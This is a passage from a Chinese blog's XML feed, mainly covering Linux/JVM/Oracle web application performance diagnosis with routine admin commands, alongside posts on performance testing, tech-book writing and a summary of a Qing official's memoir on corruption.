由于没有考虑到环境差异而导致发生问题 压力场景设计不完备导致发生问题 没有考虑到缓冲、缓存的时候而导致发生问题 没有考虑到思考时间而导致发生问题 报告内容难以理解导致客户不能认同 客户因为存在不信任感而不能认同 测试很花时间 后期工程中隐藏着性能问题，原因如下： 只有在生产环境中才会出现 问题的显现需要很多条件（环境、数据、负载生成） 因为特定的操作才导致发生性能问题 ==&gt;&gt;为系统中的性能测试流出一个月的时间。 对横跨多个领域的性能问题进行排查的时候，如果不能综合多个领域来考虑，负责人就会一直说“我负责的那部分没有问题”，导致问题无法解决。 客户关心的焦点集中在“在实际生产环境中运行时是否会出现性能方面的问题”。 由于不能很好地共享性能测试地整体过程，或者本来关于性能需求或性能测试设计地需求等地约定就很模糊，导致结论与评价基准等也变得很模糊，引起沟通不畅。 参考案例:Oracle数据库迁移割接实录 需求定义三要素：吞吐（T）、响应时间（R）、用户并发度（U） 1U x R = T 并发并不是作为性能目标通过听取客户意见来推导出来的，而是通常根据吞吐和响应时间计算出一个合适的值（客户即使了解业务中同时使用的人数，但是对于系统瞬间运行的并发处理的情况，他们并不清楚）。 集成测试：多并发运行测试系统测试：压力测试、临界测试、耐久测试运维测试：性能监控测试、故障测试 五、虚拟化环境下的性能在虚拟化环境中，多个VM（虚拟机）运行在一台服务器上，因此可以更加有效地共享资源，有利于削减成本。而反过来，若资源被共享过度，则会发生竞争，可能导致性能的下降。因此，在资源效率和性能之间取得平衡就变得尤为重要。 虚拟化的性能管理（CPU）虚拟环境下Guest OS发出的特权命令会被更改，因此和物理环境相比需要更多的处理时间。另外，物理环境下也不需要将逻辑CPU分配个VM的调度处理，如果CPU的分配发生了竞争，这个等待时间就会影响性能。 六、云计算环境下的性能 构成计算资源的技术元素并没有大的变化 网络访问和资源的使用及提供形态发生了变化 LAN网络的变化 WAN网络的变化 云计算的一个大的变化就是LAN网络。具体来说，本地部署环境下物理路由器和交换机实现的部分被隐藏起来，通过虚拟的网络来组成。 WAN连接方法：1、专线连接：主要依赖于所选择的通信运营商的服务特性，带宽保证和性能的成本与之前相比并没有太大变化。2、互联网连接：云计算服务可以非常优惠的加个来利用共享的互联网带宽，可以减轻高峰时带宽限制的顾虑。云计算服务中提供的CDN（Contents Delivery Network）或Global DNS等功能，能够很方便地提高互联网服务的速度。 随着存储的网络化，直接连接到普通的LAN的情况也越来越多，磁盘I/O变为网络I／O的情况也越来越多。在NAS（Network Attached Storage）以及云环境下，磁盘I/O在普通的TCP／IP网络中完成的情况也很多。（具体第7章） 云计算环境中开发阶段的思维方式在云计算环境下，比起技术方面的差异，思维方式上的差异更为明显。在实际业务层面最大的变化就是对以往的以硬件配置为前提的开发运维流程的影响。 1、基本设计：估算（Sizing）2、系统测试：性能测试3、项目管理 云计算环境中不需要准备硬件，但是并不代表不需要进行估算。观点一：成本估算。成本会根据选定的资源大小而有所变化。观点二：临界估算。在本地部署环境下，企业级系统很多都是集中式的处理方式，如果按照这种方式原封不懂地迁移到云计算环境，可能就会碰到瓶颈，为了消除这种风险，就需要进行估算，考虑临界容量的可实现性。 POC：Proof of Concept (概念验证)云计算的情况下，能在瞬间准备好多种模式的环境用于验证，可通过POC来验证运行情况、搭建模式与费用。 在云计算环境下，容量管理与成本管理是一体的。 云计算服务的核心是根据负载使用量收费。由于这种收费模式，原来只有工程师会关注的传送量、I／O数、HTTP请求数等详细的性能指标数据会直接反映在费用上，因此需要经营者掌握这些性能指标及其含义。使用云计算后，容量与成本就联系到一起，因此云计算可能是促使经营者学习容量分析的一个有效手段。 运维：除了应对峰值，在没有业务流量的时间段内动态削减多余的资源，降低成本，也是很有价值的。 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:Web 应用性能优化]]></title>
    <url>%2F2017%2F10%2F24%2FLinux-Perf-Wan%2F</url>
    <content type="text"><![CDATA[摘要 一、常见性能优化要求 二、优化分析过程 三、性能分析工具箱 四、系统基础问题检查 万老师多年前的一篇内部分享，发布出来供有需要的同学参考。虽然今天的应用系统的复杂度跟过去会有所不同，性能观测工具、数据规模也不可以同日而语，但是正所谓一切历史都是当代史（“Ogni storia e la storia contemporanea”），厘清过去的问题是为了更好地理解现在和未来。为了保持原貌，编辑过程中基本遵循原文，之后也不再更新。 一、常见性能优化要求在我经历的性能优化案例中，常见的问题都是这样开始的： a) 前台访问很慢，请帮忙分析优化 b) 用户对性能很不满意，再不解决就要投诉 c) 数据库负载很重，请帮忙分析一下 d) XXX功能打开需要1分钟，请帮忙分析一下。而等我访问这个功能的时候，可能几秒钟就返回；等你满怀困惑的找到问题提出人员，如果足够幸运的话，可能他告诉你要选择什么查询条件，问题能够重现；当然另一个可能是他也是转述用户的话。 在接到这些性能优化要求的时候，我都希望能够了解下面的信息以判断问题的类型，而通常情况下，我的工作都是在这些信息并不存在的情况下开始的 a)系统性的问题? 比如CPU利用率，SWAP利用率或者IO过高导致的整体性能下降？ b)功能性问题？ 整体性能良好，个别功能时延很长 c)新出现问题？什么时候开始的，之前系统有哪些变动？（升级或者管理的资源大量增加） d)不规律问题？有时候快，有时候慢，没有特定规律 还有性能快慢的衡量标准是什么？原来多少秒，现在多少秒，目标是多少秒？ 只有上述问题得到了准确的回答，优化工作才能开始。 而获取上述答案的方法就是测量，有可靠的监控工具对用户的访问时延，系统的CPU,IO,SWAP进行准确的测量，当系统发生性能瓶颈时，系统当时的状态，数据库当时的状态进行及时的记录，依赖这些数据才能开始优化。 案例1，天津客户曾经有过投诉，系统经常性的出现整体性能下降，几乎无法访问的情况，而且发生的时间没有任何规律。 我部署了监控工具，3周后分析数据，发现访问性能下降之前用户都执行了某一个历史告警查询，而在此之后的数据库性能曲线也急剧下降。研发人员对此功能优化后，问题再也没有出现。 案例2，南京客户某主机经常崩溃，根据监控工具在崩溃前记录的进程列表看，是某个程序挂起导致的进程越积越多，资源耗尽而崩溃，对该程序改进后，故障再未发生。 之所以费这么多笔墨，就是希望能够让各位明白，没有定量的测量，性能优化工作完全是空中楼阁，无法进行。而通过工具的部署和监测，今后我们提出的性能问题可能就是这样： a) 系统整体负载正常，但/nms/res/devicelist_down.jsp目前经常出现35046毫秒的访问时延，请协助排查一下 b) 系统SWAP利用率经常会超过50%，这时候系统响应很慢，杀掉GetCGFlux.pl后恢复正常，请分析一下 c) 或者数据库服务器目前CPU利用率居高不下，已经持续了一段时间，请分析一下 如果性能优化工作以这样的方式开始的话，这项工作就会变得轻松有趣得多了。 二、优化分析过程 性能数据收集 这一步是性能优化的基础，如果问题系统之前没有部署监控工具的话，那么就要部署监控工具，收集一段时间的数据后才能开始分析；当然也有例外，幸运的话，性能问题正在发生并且如此显著，比如某个程序长时间无法挂起，或者某个进程把整台主机的CPU都吃掉，或者某个功能查询很慢,次次如此。当然这种问题也就很少需要到我这，你就可以直接找开发人员解决了。 很多情况，问题可能不是那么明显，也不是那么规律，可能也涉及到系统的多项功能，这个时候，我们就必须要借助于工具来进行数据的收集。 性能数据分析 如果没有数据收集，分析工作可能很神秘，完全依赖于专家的个人经验。以前听过一个故事，一个工厂的打印机总是莫名其妙的在某个时间出现故障，后来请了一个专家，搬了把椅子坐在打印机附近，几个星期后，叫工人把地板的某个角修好，之后这个问题再也没有出现。 但是有了之前收集的数据，观察CPU，IO，应用时延，网络性能等不同指标的曲线，观察问题出现的时间点，存在问题的功能，任何一个IT业者，都应该具备从这些数据中发现问题的能力。例如某台采集机SYSLOG处理经常出现会滞后的情况。而这台机器的网络丢包是这个样子的，那么问题是不是显而易见？ 再比如有一个巡检功能，数据某个时段总是大量入库失败，那你看到数据库CPU和连接数在这个时段是这样的，数据库连接数增加，CPU空闲率为0，那么是不是问题也很明显了。 实施优化工作 这一步主要是针对之前发现的问题，采取措施。可能是系统维护人员调整采集负载，让负荷更均匀；或者调整主机或数据库参数；当然更多的可能是程序需要优化 评估优化效果 譬如上述第二个例子，采取优化措施后，无论是网络连接数还是数据库主机负载，都已经很平稳，而问题也不再出现。 如果没有达到，则不断重复上述四步，继续优化。 三、性能分析工具箱这个工具箱是我常用的性能分析工具，曾协助我解决了很多的性能优化难题 a) web访问时延监控工具AssayFilter 部署在主应用上 部署后可以在resin/logs/AssayFilter.log里面看到访问时间，访问的用户，访问的URL，时延毫秒，来源IP，据此我们就可以将用户的感知定量化，数据化 1220150227094607 zengguojin /nms/res/devicelist_down.jsp 309356 219.159.77.116 ms20150209113913 zengguojin /nms/res/devicelist_down.jsp 383042 219.159.77.116 ms 从这两条数据里我们可以知道这个用户在访问这个功能时候遭遇过多次等待300多秒的情况,他又会有怎样的满意度呢？ 针对这个工具可能有人怀疑是否准确，是否统计时延过高是网络延迟导致。这里解释一下他的工作机制，如下图： AssayFilter作为一个拦截器，统计的是访问请求进入resin之后和应答离开resin之前的时长，访问时延=resin处理时长+主应用到数据库网络时延+oracle的SQL执行时长 主应用到数据库都在一个交换机上，所以主应用到数据库网络时延可以忽略不计。 所以，这个工具完全避免了网络延迟对访问时延统计的影响，让我们的精力完全聚焦在WEB应用自身的性能上. b) 主机监控探针wd_probe 部署在主机上 这个监控探针除了能起到主机告警通知的作用，也是一个我依赖的性能分析工具，他能够记录各个时间点的CPU,SWAP,磁盘IO,网络性能，进程数量，网络连接数量的性能数据，当CPU超过预设阀值时会输出系统当时的进程快照用于事后的分析。 在探针主目录的data/perf下有性能数据，在data/tmp下有系统进程快照 c) 数据库超长SQL收集工具 部署在主应用上，可以在cron里每分钟执行一次 这个程序会不断捕捉执行时间超过6秒的sql,记录进 /tmp/sql.csv文件中，运行结果如下： 从发起端看可分为两类，通常从APP发起的JDBC程序就是用户前台访问执行的SQL,而这种SQL执行时间超过6秒就是我们需要优化的SQL. 四、系统基础问题检查 主机基础故障问题 磁盘空间是否空闲为0？ SWAP利用率是否超过40%? CPU利用率是否长时间超过85%？ 网络是否持续丢包？ 工作磁盘IO的利用率是否持续100%?上述状况通常意味着系统有较严重问题，需要进一步从程序或者数据库上查找原因。 resin的JVM检查Web应用的前台程序jsp和class都是运行在resin的JVM里，JVM(Java虚拟机)类似于oracle数据库，jsp和class类似于SQL,都可以看作一个系统软件，那么仅仅是看java进程在不在，前台能不能访问是不够的。就像没有sqlplus,PLSQL我们就无法维护数据库，同样的JVM也有相应的维护工具,，都在JAVA_HOME/bin下 a. 查看JVM的内存占用情况 1jstat -gcutil &lt;pid&gt; 3s 5 这条命令间隔3秒钟查看JVM的内存利用率，取样5次， S0 S1 E O P YGC YGCT FGC FGCT GCT 0.00 98.51 44.95 39.41 63.43 9 0.070 2 0.195 0.266 永久内存区利用率63.43%, Elden和old区分别是44.95%和39.41% b. 查看JVM的堆栈调用情况1jstack &lt;pid&gt; 这条命令把当前JVM里所有的线程调用堆栈输出。在前台访问无响应的时候，排查故障根源时特别有用。 上述Thread-831被38f06e88的线程所阻塞，而根据调用堆栈，可以准确的定位到执行程序，进行排查。 c. 查看错误日志是否有内存溢出错误日志在resin/logs/error.log或者resin/log/jvm-default.log如果有java.lang.OutOfMemoryError: PermGen space 说明JVM的永久内存区不足 -XX:MaxPermSize=256m 可根据永久内存区利用率调整到256M java.lang.OutOfMemoryError说明JVM的堆内存不足 -Xmx2048m -Xms2048m 把堆内存调大到2048G 如果把Xmx加到2G，仍然会出现上述错误，那可能是有内存泄漏，需要开发人员排查 数据库检查oracle排查比较复杂，我只能从两方面简单举几个例子。 a) 系统参数层面优化 1) sga是否充分利用了系统内存，sga可以配系统内存的一半. 而我遇到过主机64G内存，sga_target设置为5G 2) db_cache_size最好在sga_target-3G，因为我们的程序很多没有使用绑定变量,如果不设置db_cache_size,则渐渐的SGA都有被share_pool占用的趋势，数据被缓存的越来越少，获取数据需要从磁盘读取，这样整体性能肯定会下降。 3) shared_servers设置为0，让数据库运行在专有模式而不是共享服务器模式 虽然系统参数调整会在整体上带来一定的性能改善，但相比于糟糕的SQL或者程序设计以及失效的索引和过期的统计数据对性能起到的作用，还是很有限的。 b) 应用优化层面 1) 定位问题SQL 这个SQL能够列出数据库当前正在执行的所有SQL, 123select distinct s.sid,s.serial#,s.blocking_session,p.spid PID,to_char(s.logon_time,'YYYY-MM-DD HH24:MI:SS') logontime ,substr(s.machine,1,15) smachine,substr(s.program,1,20) sprogram,q.sql_id,substr(q.sql_text,1,200) sql from v$sql q,v$session s,v$process pwhere q.hash_value=s.sql_hash_value and q.address=s.sql_address and p.addr=s.paddr 基于两个判断标准我们能很快的找到问题SQL 第一种是某个进程执行的SQL占用的CPU非常高，CPU利用率从Top命令获得，进程ID即PID 第二种是某类进程执行的SQL非常多，单个CPU不高，但合并起来就非常高了。 针对SQL就可以找支撑人员进一步判断是否需要找开发人员优化。 2) 是否存在session被其他session阻塞的情况 查看上一SQL结果的blocking_session字段，如果被阻塞的进程都被某一会话锁定，需要把该session杀掉 alter system kill session ‘sid,serail#’; 遇到过几次系统非常慢的情况，经查看都是开发或者维护用plsql把某表锁住，导致相关会话都被阻塞 3) 对该SQL所涉及的表进行表分析，更新其统计信息 性能优化非常精深，很多东西我也在学习，先把经常出现的一些问题解决经验总结出来，供大家分享。 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Economist-Accounting]]></title>
    <url>%2F2017%2F10%2F23%2FAccounting%2F</url>
    <content type="text"><![CDATA[摘要 Assessment https://www.crunchbase.com https://www.funderbeam.com Reporting智臻智能 | 834869 智臻智能 | 834869 | 财务报表 - 杜邦分析 上海智臻智能网络科技股份有限公司、苹果电脑贸易（上海）有限公司与国家知识产权局专利复审委员会再审行政裁定书 gov 公安业务费开支范围和管理办法的规定 | 1991 参考文献 商业软件工程——产出会计和约束理论]]></content>
  </entry>
  <entry>
    <title><![CDATA[Religion-Buddha]]></title>
    <url>%2F2017%2F10%2F23%2FReligion-Buddha%2F</url>
    <content type="text"><![CDATA[摘要 楞严经淫逸其心。破佛律仪。潜行贪欲。口中好言诸佛应世。某处某人。当是某佛化身来此。某人即是某菩萨等。来化人间。其人见故。心生倾渴。邪见密兴。种智销灭。此名魅鬼年老成魔。恼乱是人。厌足心生。去彼人体。弟子与师。俱陷王难。汝当先觉。不入轮回。迷惑不知。堕无间狱。 尔时天魔口说经法。其人实不觉知魔著。亦言自得无上涅槃。来彼求合善男子处。敷座说法。其形及彼听法之人。外无迁变。令其听者。未闻法前。心自开悟。念念移易。或得宿命。或有他心。或见地狱。或知人间好恶诸事。或口说偈。或自诵经。各各欢娱。得未曾有。是人愚迷。惑为菩萨。 参考文献 How Helping Others Can Relieve Anxiety and Depression |New research shows one more way that compassion is beneficial.|Posted Oct 10, 2017compassionate goals were associated with lower levels of symptoms and less relationship conflict.]]></content>
  </entry>
  <entry>
    <title><![CDATA[技术写作与出版]]></title>
    <url>%2F2017%2F10%2F22%2FTechnology-Writing-Publish%2F</url>
    <content type="text"><![CDATA[摘要 电子书《Linux Perf Master》 读者问题集 被枪毙的选题 一、电子书 《Linux Perf Master》 二、纸质书2.1 那些被出版社枪毙的选题 《Linux Perf Master》Edition 1.0 | 2016 | 电子工业出版社 2.2 出书记:2016-07-28重要的事情说三遍：我要出书，我要出书，我要出书！ 缘起： 看过很多书，令人满意的着实不多；好像朋友圈很多人都出书了；现在好像很多编辑找上门的样子；不试试怎么知道不行？万一红了呢？ 劣势：智商低，以及没出过 优势：比一般赚大钱的人有时间；比一般搞技术的人更能写；比一般搞理论的人更多实践； 当前阶段：申报选题目标方向：计算机类/简约型/偏通俗/定价：50-70元之间 可能遇到的问题列表（包括但不限于）： 1.如何做市场调研？如何选题？2.如何选择合作出版社？如何在众多写手中脱颖而出？3.如何安排工作和写书的时间？4.如何设定书稿大纲？如何调研素材？5.如何管理书稿编辑过程？工具链如何选择？6.如何与后期团队合作？7.如何寻找推荐人？找谁作序？8.如何处理滞销存货？如何一版再版？ …… 参考文献 王冬生：《Puppet权威指南》作者 用黑客思想打造畅销书 为什么有些技术人员不写博客？ 我为什么鼓励工程师写博客 InfoQ编辑如何写技术文章：敏捷写作 科研圈：如何高效写论文 科研圈：如何高效追踪最新文献]]></content>
      <tags>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[私人历史文献：张集馨《时晴斋主人自叙年谱》]]></title>
    <url>%2F2017%2F10%2F22%2FHistory-Qing-ZhangJiXing%2F</url>
    <content type="text"><![CDATA[摘要 吏治：贿赂公行，政由贿出 刑狱：上下交通，枉法裁判 财政：巧立名目，巧取豪夺 军队：营制败坏，军纪荡然 背景：张集馨的个人生活 附录：张集馨的生平年表 中华书局1981年编辑出版 《道咸宦海见闻录》，作者：张集馨，（1800年－1879年），字椒云，别号时晴斋主人，江苏仪征人。道光咸丰年间历任翰林院、太原知府、道员，福建、陕甘、四川、河南、直隶、江西等省按察使、布政使、署理巡抚等职。 不同于一般大官僚自订或后人编述的年谱，多是连篇累牍自我吹嘘和阿谀谄媚之辞，该年谱主要为其任职其间所经历的官场人事浮沉、立以敏锐观察及看法之记录，记述详实但观点从己身出。张集馨翰林出身，擅长文墨、观察敏锐，其所处的时代正是清朝遭受内忧外患冲击至大之大动荡前期，张任职范围覆盖大江南北，更以一介文士多次出入幕府、统兵作战，阅历丰富，而且再加上几起几落，对于当时的政情吏治、世风民情，有较为清醒的认识。正如一个不具名的传抄者曾说：“这部书名为年谱，其实几乎等同于小说，对官场鬼蜮情形，刻画入微，不亚于清末之《官场现形记》、《二十年目睹之怪现状》”。 一、吏治：贿赂公行，政由贿出道光二十二年，张时任福建汀漳龙道。 “郡城倡楼赌馆，每月送道署费三百金，公严拒、惩办。” “将军三节两寿，粮道每次送银八百两，又表礼、水礼八色，门包四十两一次。两都统每节送银二百两，水礼四色。八旗协领八员，每节每员送银二十两，上白米四石。抚台分四季致送，每季一千三百两，节寿但送表礼、水礼、门包杂费。制台按三节致送，每节一千两，表礼、水礼八色及门包杂费，差家人赴兰州呈送。” 众多官僚的生活正所谓：“大宴会则无月无之，小应酬则无日无之。终日送往迎来，听戏宴会，几于无日不花天酒地。” 闽浙总督颜伯焘，革职后回广东原籍，途径漳州，随带物品之多，排场之大，骇人听闻。扛夫搬运箱笼什物过境，每日多至六七百名，一连十天才过完。“差役、抬夫、家属马仆从几三千名，酒席上下共用四百余桌，一住五天，实用去一万余金。” 直隶总督桂良（恭亲王岳丈，满洲正红旗，官至直隶总督、兵部尚书、文华殿大学士、军机大臣），“其胸中蕴蓄如草芥，其口中吐属如市井”，“椒戚贵族，气势熏灼”，卖缺受贿，无所顾忌。一名官员向张集馨诉苦说：“如卑职之候补苦员，亦敬送五百金，否则此官不能做矣。” 汴姓官僚向桂良行贿，得署冀州知州，“每节尚以千金为馈，是以署事几及年余，未曾更动。” 宰相门房七品官总督庆正轩，更是包庇乃至鼓励门房收红包。“庆督又以为属员多送门包，才是看得起主人，是以若辈益无忌惮。镇协参游，亦须呈送，武官有何道理，不过摊诸兵饷。文职如两司有骨气者，都抚断不敢欺侮。武职体制卑微，虽镇协亦必巴结都署家人，甚有拜弟兄结干亲者。” 中高级军官尚且如此，何况兵士乎！ 二、刑狱：上下交通，枉法裁判道光二十八年，张时任四川按察使。“各州县私立卡房，私系未定案人犯，并及无辜。” “大县卡房恒羁禁数百人，小邑亦不下数十人……户婚、田土、钱债、佃故被证人等，亦拘禁其中。每日给稀糜一瓯，终日不见天日……通省毙者，每年不下一二千人。””遂宁陈令，规避盗案处分，强以并无奸夫之十八岁幼妇为谋死亲夫，又以十七岁幼女为谋杀胞兄加功。”“盐商王姓子与同学幼童调奸不从，将幼童杀毙，移尸于门外潭中。王商贿通书役摇惑问官。”“仁寿县武生王骡子，夜率众抢劫范氏家，强奸其媳。署县某删去抢掠情节，改强为和。范氏上控。公提讯得实，问如律。” 更有甚者，各省司法衙门每年报送案件之时还需向北京刑部行贿，名之曰”秋审部费”。“四川秋审部费，向例给以六百金，部书于五六月间专人将秋审实缓底折送署，收取部费，司中不与交通，皆在省佐杂，有部办出身者网罗其事，彼即于中取利。” 三、财政：巧立名目，巧取豪夺道光二十八年，张时任四川按察使，八月署理布政使。“藩库闲款向为官吏侵蚀，分销册籍。公承办清查，于都署及通省文武衙门搜查旧案，派员勾稽，究出侵挪二万余两，追还司库。” 大清房产税“四川民情浮动，买卖地亩，几同儿戏，每有朝为售主，夕作买户者。地方官沾润税契银两，以肥身家，数日无契请印，州县提粮差追比，是以 茶坊酒肆，每讲论田土，差役必从中百计怂恿，甚而讲论未定，差役即报官勒税，稍涉争辩，即押入卡房，其风由来久矣。” 钓鱼执法“官将去任，减价勒税，名曰：放炮。繁剧地方，放炮一次，可得万金，或五七金不等。官累重者，日放谣言，云将去任，减价催税；差役又遍乡里传知，百姓贪图小利，纷纷投税。其实并无去任之说，名为太平炮。又有新官甫经到任，亦减价催税，名曰：倒炮。” 四、军队：营制败坏，军纪荡然道光十八年，张时任太原知府。“太原巨盗根寅儿抢劫典铺，与满城骁骑校长庆等皆窝贼分赃。根寅儿既捕获，复杀捕逃逸。公严缉获案，戮三人，军七人，驻防兵始畏法。” 道光十九年，张署雁平道。“绥远城防御哈楚暹，因略买民女为妾，其长官操之急，哈遂京控参佐各官赃私各款，并牵及将军、副都统徇隐，以为抵制计。奉旨：交巡抚杨国桢查办。” 同治二年，张署理陕西巡抚。“陕省西至长武东至潼关一千余里之遥，并无一兵，…… 各营例饷，只能二成。”“陕南兴义、汉中二镇、商州一协，有营无兵。汉中镇额设马步七千余人，今乃并无一人。看城门者系营中现雇，日给百文，否则亦无人受雇。榆林一镇，兵如乞丐，军械早已变卖糊口，闻调遣则现雇闲人，无非希图口粮，及临敌则狂奔而已。抚标三营城守二营，共额兵三千余员名，今所存者不及十分之一，乃系老病不堪，别无营趁，稍壮实者，或小本贸易，或受雇为勇。” 张曾先后任福建汀漳龙道台，署理福建布政使。对福建驻军腐烂情况深有体会，他认为“营制之坏，闽省极矣”：“闽省风俗，强凌弱，众暴寡，村居里处，每每被人蹂躏。若挂名营伍，门悬挂某营旗灯，凶徒便不敢滋扰……然欲入营，必先贿属，或十余元，或数十元，视家道之贫富，定数目之多寡，千、把、都、守，不能独得，将、官、提、镇，亦复分肥。……每遇征调，立时雇人，而街上乞丐流民，散遣废勇，替名顶充。既可分俸赏行装银两，每日复有应得口粮。沿途滋扰，需索逞凶，种种不法，地方畏其人众，奚敢谁何。带队千、把、都、守，各人需索，统带镇、协、参、游，亦有酒席供亿，己身不正，安能正人？且所带各兵，皆系当时招募，乌合闲人，不知纪律，营员亦不敢绳之以法，恐其哗散，及至临敌，见贼先奔。” 太平天国时期，张曾出入江南大营幕府：“各兵勇与本地居民皆为婚姻，生有子女，各怀家室之念，其无家者，雇土娼入帐轮奸，后以妒争事，闻于向帅，立斩数人，又将被雇土娼，枭示营外；乃恬不畏法，昼则在田佯为工作，夜则入街进帐，奸宿如常。贼有固志，兵无斗心，克复金陵，恐非可期于旦夕”。 五、背景：张集馨的个人生活年谱中也记录了张集馨大量的生活细节，例如： “立王氏为正室。侍余已十六年，爱兰儿（长子）如己出，抚诸婢妾尚不苛刻。家无内政，不能统属，故立之。” “黄夫人去世已十年，宿草空庭，能无悲戚。… 余时供职词馆（翰林院），禄入常不给，今幸稍丰，而夫人已埋香黄土，缘浅福薄，恨不向月下老人而详询之。” 六、附录：张集馨的生平年表嘉庆五年（1800年）三月二十九日辰时生，于江苏仪征小市口。嘉庆十二年 生母吴太夫人去世 。8岁嘉庆十四年 继母许太夫人来归。10岁嘉庆十六年 见痘症。12岁嘉庆十九年 初应童试，府县皆首列，以病未能与院试。15岁嘉庆二十三年 继母许太夫人卒。19岁嘉庆二十五年 生父卒。21岁道光二年（1822年）中第一百三十七名举人。23岁道光三年（1823年）三月应礼部试，荐而未售。 五月考取景山官学教习。 六月移居座师恩铭)家，授诸公子读。恩铭（1786年－1840年），董鄂氏，字兰士。满洲正红旗。嘉庆十三年进士，历任内阁学士、侍卫、大理寺卿，刑部、礼部尚书、左都御史、正黄旗汉军都统。 九月，从学士钱金粟先生林阅课艺。道光六年 四月，春闱落第，返里道光七年 三月，娶元配黄夫人。28岁道光九年 三月应礼部试，中第一百五十八名贡士。殿试二甲。朝考入选，钦点翰林院庶吉士。道光九年（1829年）乙丑科进士，翰林院庶吉士。30岁道光十年（1830年）十月充武英殿协修。31岁道光十二年（1832年）四月散馆一等授编修，七月充武英殿篡修。道光十六年（1836年）五月保送御史记名，补 授山西朔平府知府 ，九月抵任，赈灾治蝗。37岁道光十七年（1837年）倡议创立玉林书院。道光十八年（1838年）七月调署山西太原府。治理刑狱。38岁道光十九年（1839年）三月回朔平任。四月署山西雁平道(代县)。道光二十一年（1841年）三月补 授福建汀漳龙道 。道光二十三年 长子生。44岁道光二十四年（1844年）九月服满，入京候缺。道光二十五年（1845年）正月补 授陕西督粮道 。45岁 因旱荒向陕西巡抚林则徐(1785-1850)请示缓征，得林赏识。道光二十七年（1847年）六月补 授四川按察使 。道光二十九年（1849年）七月补授贵州布政使。道光三十年（1850年）调补 河南布政使。咸丰元年（1851年），二月召对八次。六月总督琦善因案被劾，张受累，遣戍军台。51岁。时任总督（署理）：萨阿迎咸丰二年（1852年）五月含冤到戍，十一月就庶籍，赏四品顶戴，补授河南按察使。 十二月入京，召对二次。尚未出京又调补湖北按察使。咸丰三年（1853年）二月补授直隶布政使，带兵防守。目睹直隶总督桂良与其孙麟趾卖缺受贿。因受钦差大臣胜保调遣办理军务而被桂良迁怒，参劾其“不听调度，滥用帑金”，遭革职遣戍。因军务留营免遣。咸丰五年（1855年）四月因军功赏五品顶戴。九月发往荣军营听后差遣。咸丰六年（1856年）二月抵江南大营，病假回籍就医。八月回京，九月赏四品顶戴，署甘肃布政使，召对五次。咸丰七年（1857年）二月抵甘肃就任。设立捐局为藩库理财。咸丰八年（1858年）总督乐斌令出师河州剿回，张派员调停搞定。四月丁忧回籍，十月入京。咸丰九年（1859年）五月服满，召对一次。九月加三品顶戴，署福建布政使，召对二次。咸丰十年（1860年）正月抵任（福建布政使），整顿盐茶厘金。六月调补江西布政使。 以兵燹、久雨、歉收等原因求总督曾国藩缓征丁粮，被奏革职。同治二年（1863年）正月补授陕西布政使，召对一次。三月抵任，署陕西巡抚。 麦熟时节，原巡抚瑛棨怕回不肯出城收小麦，张督兵收割并剿回。刘蓉调任巡抚。总督熙麟。同治三年（1864年）三月回原任，九月赴甘肃查办旧案，兵剿固原。64岁同治四年（1865年）正月被参革职，永不叙用。65岁（因陕西巡抚刘蓉查前总督熙麟、京堂李云麟等案） 后因军功撤销永不叙用处分。八月病休回京。同治九年（1870年）主讲金台书院，培养诸多学生。70岁 同治十三年（1874年）甲戌科状元陆润庠 光绪二年（1876年）丙子恩科榜眼王赓荣、探花冯文蔚、传胪（二甲第一名）吴树梅 光绪三年（1877年）丁丑科状元王仁堪、探花朱赓飏。光绪四年十二月十一日（1879年1月3日）北京去世。79岁]]></content>
      <tags>
        <tag>History</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[风月集 | 诗三百 思无邪]]></title>
    <url>%2F2017%2F10%2F18%2FArtistic-Poetry%2F</url>
